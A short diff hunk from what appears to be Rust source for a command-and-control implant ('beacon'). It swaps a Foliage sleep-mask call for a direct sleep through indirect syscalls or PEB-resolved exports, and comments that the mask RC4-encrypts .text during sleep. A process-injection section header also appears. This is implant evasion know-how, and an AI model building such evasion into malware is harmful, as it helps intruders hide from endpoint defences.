@@ -63,7 +63,11 @@ const SLEEPMASK_KIT: Foliage = Foliage;
 /// Beacon-facing sleep entry. Routes through the configured kit so a future
 /// encrypting impl is a one-line kit swap, not a loop edit.
 pub fn sleep(seconds: u32) {
-    SLEEPMASK_KIT.sleep_masked(seconds);
+    // Use beacon::sleep_seconds (NtWaitForSingleObject/NtDelayExecution via
+    // indirect syscall or direct PEB-resolved export). Avoids the Foliage
+    // fluctuation sleep-mask which RC4-encrypts .text during sleep — that
+    // crashes in noevasion mode where the masking init was skipped.
+    crate::beacon::sleep_seconds(seconds);
 }
 
 // ---- Process-inject kit --------------------------------------------------
